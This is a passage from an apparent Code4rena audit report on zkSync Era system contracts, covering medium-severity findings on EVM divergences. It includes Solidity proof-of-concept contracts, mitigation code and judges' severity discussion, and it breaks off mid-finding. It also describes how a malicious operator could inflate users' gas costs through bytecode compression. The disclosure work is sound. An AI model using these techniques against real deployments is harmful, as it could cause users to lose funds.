<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/precompiles/Ecrecover.yul#L7>

In zkSync Era, when the ECRECOVER precompile contract is invoked using `delegatecall`, it diverges from the usual behavior by delegating the call to the contract itself and executing its code within the caller's context. This results in a returned value that does not align with the anticipated outcome of a `precompileCall`. Instead, it yields `bytes32(0)`.

To illustrate, in the following example, when executing the provided code in the EVM, the returned `bytes32` value consistently appears as `0x000000000000000000000000759389e8e5c1aa1f511e9ea98b6caedd262bff0b` for all three scenarios: `ecrecoverStaticcall`, `ecrecoverCall`, and `ecrecoverDelegatecall`. However, in the zkSync Era, while `ecrecoverStaticcall` and `ecrecoverCall` maintain the same results as in the EVM, `ecrecoverDelegatecall` produces an incorrect outcome:

    // SPDX-License-Identifier: MIT

    pragma solidity >=0.8.20;

    contract PoC {
        bytes32 h = keccak256("");
        uint8 v = 27;
        bytes32 r = bytes32(uint256(1));
        bytes32 s = bytes32(uint256(2));

        function ecrecoverStaticcall() public returns (bytes32) {
            bytes memory data = abi.encode(h, v, r, s);
            assembly {
                pop(staticcall(gas(), 0x01, add(data, 0x20), mload(data), 0, 0x20))
                return(0, 0x20)
            }
        }

        function ecrecoverCall() public returns (bytes32) {
            bytes memory data = abi.encode(h, v, r, s);
            assembly {
                pop(call(gas(), 0x01, 0x00, add(data, 0x20), mload(data), 0, 0x20))
                return(0, 0x20)
            }
        }

        function ecrecoverDelegatecall() public returns (bytes32) {
            bytes memory data = abi.encode(h, v, r, s);
            assembly {
                pop(
                    delegatecall(gas(), 0x01, add(data, 0x20), mload(data), 0, 0x20)
                )
                return(0, 0x20)
            }
        }
    }

This discrepancy is critical in its impact because it introduces a divergence from the expected EVM response. While the likelihood of encountering this issue is not high, as precompile contracts are typically invoked through `staticcall` rather than `delegatecall`.

### Recommended Mitigation Steps

The following revised code is recommended:

    function delegateCall(
            uint256 _gas,
            address _address,
            bytes calldata _data
        ) internal returns (bytes memory returnData) {
            bool success;
            if(_address == address(0x01){
                success = rawStaticCall(_gas, _address, _data);
            } else {
                success = rawDelegateCall(_gas, _address, _data);
            }
            returnData = _verifyCallResult(success);
        }

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/EfficientCall.sol#L88>

### Assessed type

Context

**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/175#issuecomment-1794968351):**
 > It has high impact (we do not know in which context it will be used, so its wrong result can have critical impact), but low probability. So, medium is fair.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/175#issuecomment-1826878542):**
 > The Warden has shown an inconsistency in the behaviour of ecrecover when using `delegatecall`. Because the goal of the zkSync EVM is to be the EVM compatible, Medium Severity seems appropriate.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/175#issuecomment-1849019163):**
 > I have verified my statement through testing via the zksync-foundry code repo as well as reviewing both the Precompile as well as the Rust code.
>
>*Note: to view the provided image, please see the original comment [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/175#issuecomment-1849019163).*

*Note: for full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/175).*

***

## [[M-18] Discrepancy in Default Account Behavior](https://github.com/code-423n4/2023-10-zksync-findings/issues/168)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/168), also found by [Audittens](https://github.com/code-423n4/2023-10-zksync-findings/issues/809)*

Reverts in default account fallback function (when custom accounts delegate calls to a default account) may introduce security risks as protocols might not anticipate these reverts, resulting in vulnerabilities.

### Proof of Concept

As stated in the documentation regarding the `DefaultAccount`:

> The main purpose of this contract is to provide EOA-like experience for both wallet users and contracts that call it, i.e. it should not be distinguishable (apart of spent gas) from EOA accounts on Ethereum.

<https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/System%20contracts%20bootloader%20description.md#defaultaccount>

To achieve this EOA-like behavior, the fallback and receive functions of the `DefaultAccount` contract are designed in such a way that, when called or delegate-called, they mimic the actions of an EOA:

```solidity
fallback() external payable {
    // The fallback function of the default account should never be called by the bootloader
    assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS);

    // If the contract is called directly, it should behave like an EOA.
}

receive() external payable {
    // If the contract is called directly, it should behave like an EOA.
}
```

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L222-L231>

However, there's an exception to this EOA-like behavior when **a custom account delegate-calls a default account**. Suppose the custom account execution function is implemented as follows:

```solidity
function _execute(Transaction calldata _transaction) internal {
    address to = address(uint160(_transaction.to));
    (bool success,) = address(to).delegatecall("0x1234");
    require(success, "call was not successful");
}
```

In this scenario, if the `to` address is a default account, the fallback function of the default account will be invoked. Since the `msg.sender` is the bootloader address, it will trigger a revert due to `assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS)` and `success` will be `false`. This is not the expected behavior, as `to` should act like an EOA and `success` should be true.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L224>

This situation can potentially pose a significant issue for several reasons:

1. Due to the unpredictability of custom account implementations, any assertion claiming that custom accounts will not delegate calls to a default account lacks a solid foundation.
2. ZkSync Era has explicitly stated that default accounts should not be distinguishable (apart of spent gas) from EOA accounts on Ethereum. Protocols and custom accounts deployed on ZkSync Era are likely to rely on this statement, believing that they will observe consistent behavior. In practice, they might encounter different behavior, which could lead to unexpected consequences.

### Recommended Mitigation Steps

One potential solution is to add modifier `ignoreInDelegateCall` to the fallback function as well:

```solidity
    fallback() external payable ignoreInDelegateCall {
        assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS);
    }
```

### Assessed type

Context

**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/168#issuecomment-1794964537):**
 > It is showing that default account is not purely simulating EOA. So, medium is fair.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/168#issuecomment-1829775920):**
 > The Warden has shown an edge case for Default Accounts, due to this being a discrepancy in intended behaviour, Medium Severity seems most appropriate.

***

## [[M-19] Divergences in the Simulation of the `extcodehash` EVM Opcode](https://github.com/code-423n4/2023-10-zksync-findings/issues/133)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/133), also found by [quarkslab](https://github.com/code-423n4/2023-10-zksync-findings/issues/1142), [rvierdiiev](https://github.com/code-423n4/2023-10-zksync-findings/issues/1139), [0xstochasticparrot](https://github.com/code-423n4/2023-10-zksync-findings/issues/959), and [erebus](https://github.com/code-423n4/2023-10-zksync-findings/issues/521)*

The divergences in the emulation of the `extcodehash` EVM opcode within zkSync Era carry several potential impacts, specially on Developers relying on zkSync Era's assurance that it emulates the `extcodehash` opcode as per EIP-1052 might encounter unexpected behavior in their smart contracts.

### Proof of Concept

The `getCodeHash` function within the zkSync Era is designed to emulate the functionality of the `extcodehash` Ethereum Virtual Machine (EVM) opcode, as laid out in the Ethereum Improvement Proposal 1052 (EIP-1052). 

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/AccountCodeStorage.sol#L89>

However, it's important to recognize that this function does not exhibit precisely identical behavior to the EVM's `extcodehash` opcode. There are specific discrepancies:

1. EIP-161 defines an account as "empty" when it satisfies certain criteria: no code, a nonce value of zero, and a balance of zero. According to EIP-1052, the `extcodehash` of an empty account should evaluate to `bytes32(0)`. In the zkSync Era, the behavior aligns with this definition when `codeHash` is `0x00`, `getRawNonce(account)` is `0`, and `isContractConstructing(codeHash)` is `false`. If an account has nonzero balance, then based on the definition of EIP-161, it will not be considered as an empty account anymore. In this case, that account will be considered as an account with no code. So, `extcodehash` of such account will be `keccak256("")` in EVM.

**The issue is that, zkSync Era returns `bytes32(0)` regardless of the balance of the account. It only cares about the nonce and the code.**

2. Based on EIP-1052, the `extcodehash` of an precompile contract is either `keccak256("")` or `bytes32(0)`. For instance, the `extcodehash` of `address(0x02)`—representing the SHA-256 precompile contract in the EVM—should be `keccak256("")` because it has no code, a nonce of zero, and a nonzero balance.

**In contrast, the zkSync Era consistently returns `keccak256("")` for precompile contracts, regardless of their balances. The zkSync Era's behavior is based solely on whether the address is lower/equal to `CURRENT_MAX_PRECOMPILE_ADDRESS`.**

These observed inconsistencies could potentially raise concerns for developers who rely on zkSync Era's assertion that it accurately simulates the `extcodehash` EVM opcode as dictated by the EIP-1051 specification.

### Recommended Mitigation Steps

The following code is recommended to simulate the `extcodehash` EVM opcode precisely based on EIP-1052.

```solidity
function getCodeHash(uint256 _input) external view override returns (bytes32) {

        address account = address(uint160(_input));
        if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS && account.balance != 0) {
            return EMPTY_STRING_KECCAK;
        } else if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS && address(account).balance == 0) {
            return bytes32(0);
        }

        bytes32 codeHash = getRawCodeHash(account);

        if (codeHash == 0x00 && NONCE_HOLDER_SYSTEM_CONTRACT.getRawNonce(account) > 0) {
            codeHash = EMPTY_STRING_KECCAK;
        }
        else if (Utils.isContractConstructing(codeHash)) {
            codeHash = EMPTY_STRING_KECCAK;
        } else if (codeHash == 0x00 && NONCE_HOLDER_SYSTEM_CONTRACT.getRawNonce(account) == 0 && address(account).balance != 0) {
            codeHash = EMPTY_STRING_KECCAK;
        }

        return codeHash;
    }
```

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/AccountCodeStorage.sol#L89>

### Assessed type

Context

**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/133#issuecomment-1794951243):**
 > The impact is medium, the probability is low. So, low severity can be fair.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/133#issuecomment-1826035774):**
 > While I agree with low impact, this seem to be an inconsistency in the implementation of the EVM, which makes the finding notable.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/133#issuecomment-1826036942):**
 > I would have a different perspective for an ERC or some implementation; however, in this case this is an opcode that behaves differently (although in a edge case). At this time, I believe Medium Severity is most appropriate as the finding demonstrates an inconsistent behaviour of the EVM with the zkSyncVM, as it breaks a coding convention that goes beyond a best-practice.

***

## [[M-20] Nonce Behavior Discrepancy Between zkSync Era and EIP-161](https://github.com/code-423n4/2023-10-zksync-findings/issues/92)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/92)*

The discrepancy in deployment nonce behavior between zkSync Era and EVM can cause problems for contract factories and developers. zkSync Era starts the deployment nonce at zero, unlike the EVM, where it starts at one. This difference may lead to incorrect predictions of child contract addresses.

### Proof of Concept

As per EIP-161, it's specified that account creation transactions and the CREATE operation should increase the nonce beyond its initial value by **one**.

<https://github.com/ethereum/EIPs/blob/master/EIPS/eip-161.md#specification>

> Account creation transactions and the CREATE operation SHALL, prior to the execution of the initialisation code, increment the nonce over and above its normal starting value by one (for normal networks, this will be simply 1, however test-nets with non-zero default starting nonces will be different).

In other words, when an EOA (for example with nonce 100) deploys a contract (named as "contract X"), the nonces will be (please note that the nonce of the newly-deployed contract X is also incremented by one):

    nonce(EOA): 100 -> 101 
    nonce(contract X): 0 -> 1

And when in another transaction, this contract X deploys another contract (named as "contract Y"), the nonces will be (again please note that the nonce of the newly-deployed contract Y is also incremented by one):

    nonce(EOA): 101 -> 102 
    nonce(contract X): 1 -> 2
    nonce(contract Y): 0 -> 1

However, during the zkSync Era, there is a divergence from the Ethereum standard. In this context, the deployment nonce for a newly created contract initiates at zero. This deviation from the EVM standard can impact factories that anticipate the addresses of child contracts and make decisions based on these assumptions. Such factories might mistakenly assume that their nonce starts at 1, mirroring the EVM, leading to discrepancies between anticipated and actual addresses of the deployed child contracts.

### Recommended Mitigation Steps

It is advisable to increment the deployment nonce of a contract by one before invoking its constructor. Moreover, this contrast should be documented to provide clarity for developers.

    function _constructContract(
            address _sender,
            address _newAddress,
            bytes32 _bytecodeHash,
            bytes calldata _input,
            bool _isSystem,
            bool _callConstructor
        ) internal {
            NONCE_HOLDER_SYSTEM_CONTRACT.incrementDeploymentNonce(_newAddress);
            //...
        }

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L322>

### Assessed type

Context

**[miladpiri (zkSync) acknowledged and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1803654621):**
 > Medium/Low. The impact can be high (depending on the context), and probality is medium to high (any factory can be affected).
> I am thinking that if a factory creates a child, and child also creates second contract, and factory already transfers ETH to the second contract address (assuming that nonce of child is one, leading to predict the second contract address wrongly). Fund is lost. 

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1812462720):**
 > We have an historical record of awarding non-evm equivalence that can cause damage as med, so I'm inclined to maintain the severity. Will double check.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1826878015):**
 > The Warden has shown a discrepancy in the CREATE opcode for Contracts deployed on the zkEVM. While impact should be low in many scenarios, this highlights a discrepancy between zkEVM and EVM, which is notable, for this reason Medium Severity seems most appropriate.

**[anon (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1836074188):**
 > The identified issue could potentially affect numerous widely-used projects and libraries. As an illustration:
> 
> The create3 library facilitates EVM contract creation, resembling `CREATE2` but differing in that it excludes the contract `initCode` from the address derivation formula. The process involves employing the `CREATE2` method to deploy a new proxy contract, which subsequently deploys the child contract using `CREATE`. This keyless deployment approach removes reliance on the account owner who deployed the factory contract.
> 
> Examining the `CREATE3` library in [solmate](https://github.com/transmissions11/solmate/blob/main/src/utils/CREATE3.sol#L9) or [solady](https://github.com/Vectorized/solady/blob/main/src/utils/CREATE3.sol#L8), the child contract's address is computed based on the [address](https://github.com/transmissions11/solmate/blob/main/src/utils/CREATE3.sol#L77-L85) of the proxy contract and its nonce. Notably, the [nonce](https://github.com/transmissions11/solmate/blob/main/src/utils/CREATE3.sol#L83) of the proxy contract is hardcoded as `hex"01"`. This choice aligns with EIP-161, specifying that account creation transactions and the `CREATE` operation should increment the nonce beyond its initial value by one. However, in the zkSync Era, the nonce does not increase by one, so unexpectedly this mechanism does not work on zkSync Era as on EVM.
> 
> Given that this library or a similar mechanism is widely used (as seen in [AxelarNetwork](https://github.com/axelarnetwork/axelar-gmp-sdk-solidity/blob/main/contracts/deploy/Create3.sol#L15) and [MeanFinance](https://github.com/Mean-Finance/deterministic-factory/blob/main/solidity/contracts/DeterministicFactory.sol#L8)), any deviation from the expected behavior could impact numerous contracts dependent on the correct address of the child contract. 
> 
> Consequently, I assert that the significance of this bug should be classified as high.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1845202289):**
 > After reviewing the issue and consulting with another Judge.
> 
> While the issue is notable, I believe that the finding is limited in its impact in the sense that it shows a discrepancy against the EVM. Integrators would be subject to an incorrect functionality which would be found rationally through the first usage or an integration test.
> 
> In the case in which said factory was in scope, then a High Severity would have been appropriate. But in lack of it, the finding impacts the compatibility of zkSync with the EVM, meaning Medium Severity is most appropriate.

**[vladbochok (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1855335245):**
 > 1. Nonce is not visible inside the VM execution, the only resulted address will be derived from the nonce `1`, not `0`.
> 2. The rule of address derivation on Era is different. Not only by a specific different formula but also by using two separate nonces - deployment nonce and min nonce. One is used for deployment and another for the contract address derivation. That is different from Ethereum itself, and has much bigger impact on the address prediction than just nonce that nonce value been used in the derivation. 
> 
> I do think that the maximum impact is low, due to the reason that only infra is affected, I would like to see the real contract deployed on Ethereum that would affected rather than very hypothetical assumptions about developers and users. The likelihood is also very low. All in all, I don't think this issue has proven to have some severity. 

***

## [[M-21] Deployment Nonce Does not Increment For a Reverted Child Contract](https://github.com/code-423n4/2023-10-zksync-findings/issues/91)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/91)*

There is an inconsistency between zkSync Era and Ethereum Virtual Machine (EVM) in handling deployment nonce leading to significant consequences. In EVM, the factory's nonce is increased at the beginning of child contract creation, and if the child contract's creation fails, the nonce is not rolled back. In zkSync Era, the deployment nonce increases during the deployment process, and if the child contract constructor reverts, the entire transaction, including the increased deployment nonce, also reverts.

### Proof of Concept

In zkSync Era, when a factory contract deploys another contract using low-level creation operations (i.e. using `CREATE` or `CREATE2` in assembly, instead of using `new`), it is expected that the deployment nonce of the factory will increment by one, akin to the behavior in the Ethereum Virtual Machine (EVM). However, a notable issue arises when the constructor of the child contract encounters a revert.

In the EVM, the nonce of the factory increases as soon as the `CREATE` operation begins, regardless of whether the child contract creation is ultimately successful. This can be seen in `GETH` codebase, where the nonce of the factory is increased at line 431. Then, the EVM captures a snapshot, at line 443, to manage any potential failures, allowing for a graceful revert, at line 492, in case of unsuccessful child contract creation. In such cases, the returned address is `address(0),` indicating a failed contract creation attempt.

<https://github.com/ethereum/go-ethereum/blob/dc34fe8291bfcaefbce97f559e9610beffb2e470/core/vm/evm.go#L431><br>
<https://github.com/ethereum/go-ethereum/blob/dc34fe8291bfcaefbce97f559e9610beffb2e470/core/vm/evm.go#L443><br>
<https://github.com/ethereum/go-ethereum/blob/dc34fe8291bfcaefbce97f559e9610beffb2e470/core/vm/evm.go#L492>

However, zkSync Era differs in its approach. When the `CREATE` opcode is employed, it invokes the `create` or `create2` function within the `ContractDeployer` contract.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L146><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L130>

This action results in the incremented deployment nonce of the factory, and, in the final stages of contract creation, it calls the constructor of the child contract.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L189><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L344>

In the event of a revert in the child contract's constructor, the entire transaction in the `ContractDeployer` is reverted. Consequently, the incremented deployment nonce of the factory is also rolled back, and the returned address signifies an unsuccessful contract creation attempt by being set to `address(0).`

This divergence in nonce management between zkSync Era and the EVM could have far-reaching implications, especially for factories that are deployed on zkSync Era and assume that the deployment nonce behaves in a manner consistent with the EVM.

### PoC

Calling the function `test` triggers the internal function `deploy` three times. In each call, the child contract is deployed, and two values are returned: the predicted address of the to-be-deployed child and the address of the deployed child. The first and third deploy calls provide `false` as an argument to ensure that the constructor of the child doesn't revert. In the second deploy call, `true` is used as an argument, causing the constructor of the child to revert.

Comparing the predicted addresses with the deployed addresses reveals the following:

- In EVM: When the second child contract reverts, the factory's nonce increases. Consequently, the predicted address of the third child still matches its deployed address.
- In zkSync Era: When the second child contract reverts, the factory's nonce remains unchanged. As a result, the deployed address of the **third** child matches the predicted address of the **second** child.

It's worth noting that the initial value of the variable `nonce` is set to one for the EVM PoC, while it is set to zero for the zkSync Era PoC. This difference is unrelated to this report and has been explained in a separate report.

**In EVM:**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract Factory {
    uint256 nonce = 1;

    address public predictedAddress1;
    address public predictedAddress2;
    address public predictedAddress3;

    address public deployedAddress1;
    address public deployedAddress2;
    address public deployedAddress3;

    function test() public {
        (predictedAddress1, deployedAddress1) = deploy(false);
        (predictedAddress2, deployedAddress2) = deploy(true);
        (predictedAddress3, deployedAddress3) = deploy(false);
    }

    function deploy(bool _shouldRevert) internal returns (address, address) {
        bytes memory bytecode = type(Child).creationCode;
        bytecode = abi.encodePacked(bytecode, abi.encode(_shouldRevert));

        address addr;
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        return (predict(), addr);
    }

    function predict() public returns (address) {
        address predicted = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            address(this),
                            uint8(nonce++)
                        )
                    )
                )
            )
        );
        return predicted;
    }
}

contract Child {
    constructor(bool _shouldRevert) {
        if (_shouldRevert) {
            revert();
        }
    }
}

```

The result for EVM is:

- `predictedAddress1`: 0xbd5b354220B250DF257ed5e988Fe8FE81CdB6235
- `deployedAddress1`: 0xbd5b354220B250DF257ed5e988Fe8FE81CdB6235
- `predictedAddress2`: 0x02180dD815cA64898F6126f3911515B06D17acaD
- `deployedAddress2`: 0x0000000000000000000000000000000000000000
- `predictedAddress3`: 0x0A9C6D9d0AF27FC9F3F96196c3F8c89C79Df287D
- `deployedAddress3`: 0x0A9C6D9d0AF27FC9F3F96196c3F8c89C79Df287D

**In zkSync Era:**

```
// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract Factory {
    uint256 nonce = 0;

    address public predictedAddress1;
    address public predictedAddress2;
    address public predictedAddress3;

    address public deployedAddress1;
    address public deployedAddress2;
    address public deployedAddress3;

    function test() public {
        (predictedAddress1, deployedAddress1) = deploy(false);
        (predictedAddress2, deployedAddress2) = deploy(true);
        (predictedAddress3, deployedAddress3) = deploy(false);
    }

    function deploy(bool _shouldRevert) internal returns (address, address) {
        bytes memory bytecode = type(Child).creationCode;
        bytecode = abi.encodePacked(bytecode, abi.encode(_shouldRevert));

        address addr;
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        return (predict(), addr);
    }

    function predict() public returns (address newAddress) {
        bytes32 hash = keccak256(
            bytes.concat(
                keccak256("zksyncCreate"),
                bytes32(uint256(uint160(address(this)))),
                bytes32(nonce++)
            )
        );

        newAddress = address(uint160(uint256(hash)));
    }
}

contract Child {
    constructor(bool _shouldRevert) {
        if (_shouldRevert) {
            revert();
        }
    }
}

```

The result for zkSync Era is:

- `predictedAddress1`: 0xBADCfBd5E90eA6558580B8C6220b750E9438df7c
- `deployedAddress1`: 0xBADCfBd5E90eA6558580B8C6220b750E9438df7c
- `predictedAddress2`: 0xB7E8A1191E6Ef0F3A752eCaa050F0FF7BcaEAF51
- `deployedAddress2`: 0x0000000000000000000000000000000000000000
- `predictedAddress3`: 0xfBAE6B995fe81b48A5e389A81E8Af0ee2AaF7302
- `deployedAddress3`: 0xB7E8A1191E6Ef0F3A752eCaa050F0FF7BcaEAF51

As you see, the `deployedAddress3` is equal to `predictedAddress2` which is not correct.

### Recommended Mitigation Steps

A potential solution might involve invoking the `_constructContract` function externally within a try/catch block. By doing so, if `_constructContract` reverts (as occurred with the child contract), the deployment nonce won't be rolled back. However, implementing this kind of modification would necessitate reviewing and changing other parts of the code as well.

    function _performDeployOnAddress(
            bytes32 _bytecodeHash,
            address _newAddress,
            AccountAbstractionVersion _aaVersion,
            bytes calldata _input
        ) internal {
            // ...

            try this.constructContract(msg.sender, _newAddress, _bytecodeHash, _input, false, true){//...}
            catch{//...}
              
        }

### Assessed type

Context

**[miladpiri (zkSync) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1794566240):**
 > This can have high impact (it depends on the context), and the probability is medium to high (implementing factory contract is frequent). Medium severity can be fair.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1829785428):**
 > At this time, I am marking the finding as Medium for EVM non equivalence. Please do raise concerns if you can show a specific way to cause loss of funds or broken behaviour for contracts that are widely used.

**[anon (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1836092181):**
 > This issue may pose a challenge when a factory contract, sharing the same address, is deployed on different chains and is intended to generate multiple proxy contracts with identical addresses (because the address of the created proxy contract relies on the factory's address and its nonce).
> 
> Consider a situation where a factory is deployed with the same address on both Ethereum and zkSync Era (its forks, or other chains). The address of the proxy contract generated by this factory is dependent on the factory's address and its nonce. If, for any reason, a proxy creation fails (for instance, encountering a REVERT during the execution of its `initcode` or running out of gas), the nonce of the factory will increase on Ethereum but not in the zkSync Era. Consequently, the nonces of the factory on both chains will no longer be synchronized, leading to divergent addresses for proxies created by this factory on the two chains going forward.
> 
> ```solidity
> // SPDX-License-Identifier: MIT
> pragma solidity 0.8.20;
> 
> contract Factory {
> 
>     function deploy(bytes[] memory _proxy) external {
>         bytes memory bytecode;
> 
>         for (uint256 i = 0; i < _proxy.length; ++i) {
>             bytecode = _proxy[i];
>             assembly {
>                 pop(create(0, add(bytecode, 0x20), mload(bytecode)))
>             }
>         }
>     }
> 
>     function proxyAddress(uint256 _nonce) public view returns (address) {
>         address predicted = address(
>             uint160(
>                 uint256(
>                     keccak256(
>                         abi.encodePacked(
>                             bytes1(0xd6),
>                             bytes1(0x94),
>                             address(this),
>                             uint8(_nonce)
>                         )
>                     )
>                 )
>             )
>         );
>         return predicted;
>     }
> }
> ```
> 
> Given the frequent implementation of factory contracts (whether for ensuring the consistency of proxy contract addresses across different chains or for other use cases), the impact classification of this issue can be high.

**[unforgiven (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1837486592):**
 > Regarding your above [comment](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1836092181), which says:
> >Consider a situation where a factory is deployed with the same address on both Ethereum and zkSync Era (its forks, or other chains).
> 
> I want to mention that according to the [docs](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/docs/Smart%20contract%20Section/L1%20smart%20contracts.md#L86) currently it's impossible to for Ethereum and zkSync contract to have `sameaddress`:
>
> > For most of the rollups the address aliasing needs to prevent cross-chain exploits that would otherwise be possible if we simply reused the same L1 addresses as the L2 sender. In zkSync Era address derivation rule is different from the Ethereum, so cross-chain exploits are already impossible. However, zkSync Era may add full EVM support in the future, so applying address aliasing leaves room for future EVM compatibility.

**[anon (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1837605662):**
 > You are correct that the address derivation in zkSync Era differs from Ethereum. However, my key point is that developers considering the idea of using a factory to generate proxies with identical addresses (on zkSync Era, its forks, and etc.) will encounter the issue of nonce asynchronization.

**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1839001570):**
 > Agree. This can be an issue.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1840776387):**
 > I believe that the finding is valid and Medium. It can cause issues, in some specific scenarios, which are possible but not as common and they are implementation reliant. The issues are not guaranteed, the behaviour is "sometimes" wrong.
> 
> If a contract factory was in scope, I can see the argument for raising the severity; but a `create2` or `create3` deployer, as well as common factories with mappings for children, would work as intended, leading me to confirm Medium Severity as the most appropriate.

***

## [[M-22] Potential Gas Manipulation via Bytecode Compression](https://github.com/code-423n4/2023-10-zksync-findings/issues/71)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/71), also found by [OffsideLabs](https://github.com/code-423n4/2023-10-zksync-findings/issues/885), [Audittens](https://github.com/code-423n4/2023-10-zksync-findings/issues/804), and [zkrunner](https://github.com/code-423n4/2023-10-zksync-findings/issues/309)*

Malicious operators could exploit this issue to overcharge users by artificially increasing the length of the dictionary without any benefit to the encoding process. As a result, users may end up paying higher gas costs for message publication in L1, leading to an adverse financial impact. This issue undermines the intended efficiency and cost-effectiveness of the compression mechanism.

### Proof of Concept

When processing L2 transactions, it is essential to mark the user's provided `factoryDeps` on L2 and subsequently publish them to L1.

`bootloader::processL2Tx >> bootloader::l2TxExecution >> bootloader::ZKSYNC_NEAR_CALL_markFactoryDepsL2 >> bootloader::sendCompressedBytecode >> Compressor::publishCompressedBytecode` 

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/Compressor.sol#L54>

This process involves compression to reduce gas consumption during publishing to L1. The sequence of actions are as follows:

1. The remaining gas allocated by the user is utilized to initiate the publication of `factoryDeps`.

    <https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1242>

2. Compressed data is sent to L1.

    <https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/Compressor.sol#L79>

3. Gas consumption is determined by the length of the transmitted message.

    <https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/L1Messenger.sol#L153>

However, this process could be exploited by a malicious operator to overcharge users. Through manipulation of the compression method, the operator could inflate gas costs. In this context, not only may the compressed bytecode fail to be shorter than the original, but it could even become longer.

To illustrate, consider an example where the bytecode to be compressed and published is `ABCB` (with each character representing 8 bytes). Notably, the second and fourth 8-byte segments are identical.

In an ideal compression scenario, the `_rawCompressedData` would appear as: `0x0003ABC0000000100020001`. Here, `ABC` forms the `dictionary`, and `encodedData` is `0x0000000100020001`. The prefix `0x0003` indicates the dictionary's length in 8-byte segments, while the `encodedData` references the dictionary's segments in this order: `0, 1, 2, 1`, which corresponds to `A, B, C, and B`, respectively.

